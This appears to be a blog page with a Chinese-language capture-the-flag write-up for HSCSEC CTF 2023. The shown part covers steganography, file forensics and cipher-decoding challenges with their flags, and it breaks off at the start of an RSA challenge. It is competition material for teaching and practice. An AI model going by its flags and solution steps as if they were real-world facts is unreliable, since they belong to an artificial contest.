<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>HSCSEC CTF 2023 (HSC-2th 2023) | Lazzaro</title><meta name="description" content="​     2023&#x2F;02&#x2F;11 00:00 UTC+8 - 2023&#x2F;02&#x2F;12 23:59 UTC+8 本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。前十名可获得合作伙伴赞助礼品以及实体证书。 Ra"><meta property="og:type" content="article"><meta property="og:title" content="HSCSEC CTF 2023 (HSC-2th 2023)"><meta property="og:url" content="https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="​     2023&#x2F;02&#x2F;11 00:00 UTC+8 - 2023&#x2F;02&#x2F;12 23:59 UTC+8 本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。前十名可获得合作伙伴赞助礼品以及实体证书。 Ra"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2023-02-12T14:23:55.000Z"><meta property="article:modified_time" content="2023-02-12T16:47:31.210Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2023赛"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">50</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13px">2025赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SIGNIN"><span class="toc-number">1.1.</span> <span class="toc-text">SIGNIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LINUX"><span class="toc-number">1.2.</span> <span class="toc-text">LINUX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Salute"><span class="toc-number">1.3.</span> <span class="toc-text">Salute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZIMG"><span class="toc-number">1.4.</span> <span class="toc-text">EZIMG</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ancient-MISC"><span class="toc-number">2.</span> <span class="toc-text">Ancient-MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Deduced-gossip"><span class="toc-number">2.1.</span> <span class="toc-text">Deduced gossip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Watch-the-sky-at-night"><span class="toc-number">2.2.</span> <span class="toc-text">Watch the sky at night</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">3.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZRSA"><span class="toc-number">3.1.</span> <span class="toc-text">EZRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Operator"><span class="toc-number">3.2.</span> <span class="toc-text">Operator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZVC"><span class="toc-number">3.3.</span> <span class="toc-text">EZVC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">4.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZSSTI"><span class="toc-number">4.1.</span> <span class="toc-text">EZSSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EASYPHY"><span class="toc-number">4.2.</span> <span class="toc-text">EASYPHY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZSYFLASK"><span class="toc-number">4.3.</span> <span class="toc-text">EZSYFLASK</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">5.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DECOMPILEONEOONE"><span class="toc-number">5.1.</span> <span class="toc-text">DECOMPILEONEOONE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Whack-a-mole"><span class="toc-number">5.2.</span> <span class="toc-text">Whack-a-mole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Base-secrets"><span class="toc-number">5.3.</span> <span class="toc-text">Base secrets</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">6.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZPWN"><span class="toc-number">6.1.</span> <span class="toc-text">EZPWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Morris-II"><span class="toc-number">6.2.</span> <span class="toc-text">Morris II</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyHeap"><span class="toc-number">6.3.</span> <span class="toc-text">EasyHeap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Safe-Program"><span class="toc-number">6.4.</span> <span class="toc-text">Safe Program</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Social-Engineering"><span class="toc-number">7.</span> <span class="toc-text">Social Engineering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Happy-Lantern-Festival"><span class="toc-number">7.1.</span> <span class="toc-text">Happy Lantern Festival</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beautiful-Lake"><span class="toc-number">7.2.</span> <span class="toc-text">Beautiful Lake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apple-Store"><span class="toc-number">7.3.</span> <span class="toc-text">Apple Store</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beautiful-Park"><span class="toc-number">7.4.</span> <span class="toc-text">Beautiful Park</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Boat"><span class="toc-number">7.5.</span> <span class="toc-text">Boat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Airplane"><span class="toc-number">7.6.</span> <span class="toc-text">Airplane</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tower"><span class="toc-number">7.7.</span> <span class="toc-text">Tower</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cable-car"><span class="toc-number">7.8.</span> <span class="toc-text">Cable car</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Romantic-firework"><span class="toc-number">7.9.</span> <span class="toc-text">Romantic firework</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-HSCSEC-CTF-2023" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">HSCSEC CTF 2023 (HSC-2th 2023)</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2023/02/12/match-HSCSEC-CTF-2023/" class="article-date"><time datetime="2023-02-12T14:23:55.000Z" itemprop="datePublished">2023-02-12</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2023%E8%B5%9B/" rel="tag">2023赛</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2023/02/12/match-HSCSEC-CTF-2023/" class="leancloud_visitors" data-flag-title="HSCSEC CTF 2023 (HSC-2th 2023)"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/02/12/match-HSCSEC-CTF-2023/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>​</p><p>2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8</p><p>本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。前十名可获得合作伙伴赞助礼品以及实体证书。</p><p><strong>Rank: 1</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="SIGNIN"><a href="#SIGNIN" class="headerlink" title="SIGNIN"></a>SIGNIN</h3><blockquote><p>关注公众号：中龙 红客突击队 发送：HSCCTF{TELLMEFLAG}获取flag！</p></blockquote><p>公众号签到，<code>HSCSEC&#123;W3Ic0m3_t0_HScCtF2tH&#125;</code>。</p><p>​</p><h3 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h3><blockquote><p>flag2为用户登录的密码<br>下载：<br>百度网盘：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2">https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2</a><br>提取码：HSC2<br>腾讯网盘：<a target="_blank" rel="noopener" href="https://share.weiyun.com/EyhLtHnF">https://share.weiyun.com/EyhLtHnF</a><br>密码：jyk6t9<br>奶牛快传： <a target="_blank" rel="noopener" href="https://cowtransfer.com/s/d83e0de581aa49">https://cowtransfer.com/s/d83e0de581aa49</a> 点击链接查看 [ LINUX.rar ] ，或访问奶牛快传 cowtransfer.com 输入传输口令 xgzg82 查看；</p></blockquote><p>非预期，直接16进制查看文件，搜字符串 <code>HSCSEC&#123;</code> 发现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu/Desktop# history</span><br><span class="line">    1  f1aG1:HSCSEC&#123;Lim3_</span><br><span class="line">    2  exit</span><br><span class="line">    3  ubuntu20.04</span><br><span class="line">    4  history</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;flag3:_iez&#125;&quot; &gt; /f1Ag3</span><br></pre></td></tr></table></figure><p>连接得flag：<code>HSCSEC&#123;Lim3_ubuntu20.04_iez&#125;</code>。</p><p>​</p><h3 id="Salute"><a href="#Salute" class="headerlink" title="Salute"></a>Salute</h3><p>解压得到 <code>encode_salute</code> 文件，尾部有 <code>525d93ceb70e2bf5daa84ec3d0cd2c731a</code>，md5查询得明文 <code>qwer1234</code>，以此为密钥与文件异或，还原得到rar文件。</p><p>文件里一张jpg图片一张png图片，用stegsolve查看png图片alpha0通道，有 <code>flag2/key that_is</code> 字样。</p><p>再以此为密码，用steghide提取jpg图片的隐藏信息：<code>steghide extract -sf salute.jpg</code>，得到flag文件内容 <code>flag3:_c0ol&#125;</code>。</p><p>连接为flag：<code>HSCSEC&#123;qwer1234that_is_c0ol&#125;</code>。</p><p>​</p><h3 id="EZIMG"><a href="#EZIMG" class="headerlink" title="EZIMG"></a>EZIMG</h3><p>png图片尾部有01串+反转的png，提取01串做二维码图，扫出内容 <code>flag2:aQR_c0de_and</code>；反转的png还原为新png图，反色处理得到 <code>HSCSEC&#123;p3G_h</code>。</p><p>少了第三部分，对新png图尝试使用<a target="_blank" rel="noopener" href="http://tools.jb51.net/aideddesign/img_add_info">PixelJihad解密</a>，得到 <code>_3nc&#125;</code>。</p><p>连接为flag：<code>HSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;</code>。</p><p>​</p><h2 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h2><h3 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h3><blockquote><p>☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲</p></blockquote><p>猜测为八卦+空一一对应9个数字，根据 <code>HSCSEC&#123;&#125;</code> 对应的九进制数，可知7个符号对应的数，剩下的2个测试即可。</p><p>最终对应 <code>80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148</code></p><p>转换为十进制：<code>72 83 67 83 69 67 123 67 104 105 110 101 115 101 95 103 48 115 115 112 125</code></p><p>转换为字符串：<code>HSCSEC&#123;Chinese_g0ssp&#125;</code>，还得手动补全单词才正确……</p><p>flag：<code>HSCSEC&#123;Chinese_g0ssip&#125;</code>。</p><p>​</p><h3 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h3><blockquote><p>斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴<br>虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐<br>壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马<br>虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓<br>室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐<br>牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌<br>危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐<br>斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡<br>危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴<br>牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎<br>室火猪鬼金羊柳土獐壁水貐</p></blockquote><p>查到每三个字组成的词为28星宿里的一种，且根据方位分别归类到青龙、白虎、朱雀、玄武四大类中：</p><p>青龙：角木蛟、亢金龙、氐土貉、房日兔、心月狐、尾火虎、箕水豹<br>玄武：斗木獬、牛金牛、女土蝠、虚日鼠、危月燕、室火猪、壁水貐<br>白虎：奎木狼、娄金狗、胃土雉、昴日鸡、毕月乌、觜火猴、参水猿<br>朱雀：井木犴、鬼金羊、柳土獐、星日马、张月鹿、翼火蛇、轸水蚓</p><p>按4进制分别替换为0-3，得到 <code>1020 1103 1003 1103 1011 1003 1323 1003 1032 1133 1001 1232 1203 1221 1211 1232 1310 1133 1001 1100 1331</code>。</p><p>转换为十进制：<code>72 83 67 83 69 67 123 67 78 95 65 110 99 105 101 110 116 95 65 80 125</code></p><p>转换为字符串：<code>HSCSEC&#123;CN_Ancient_AP&#125;</code>。</p><p>​</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> m</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = m * e * <span class="number">1</span> * <span class="number">2022</span> * p</span><br><span class="line">c = <span 